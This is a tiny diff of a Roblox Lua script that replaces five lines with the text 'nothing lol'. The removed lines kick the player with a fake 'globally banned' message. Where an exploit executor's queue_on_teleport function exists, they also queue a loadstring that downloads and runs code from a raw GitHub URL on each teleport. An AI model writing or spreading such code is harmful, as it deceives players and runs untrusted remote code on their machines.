@@ -1,5 +1,1 @@
-game.Players.LocalPlayer:Kick("🔒 You are globally banned from all Roblox experiences.")
-
-if queue_on_teleport then
-    queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/7dksbpxuw8/Use/main/Test'))()")
-end
+nothing lol
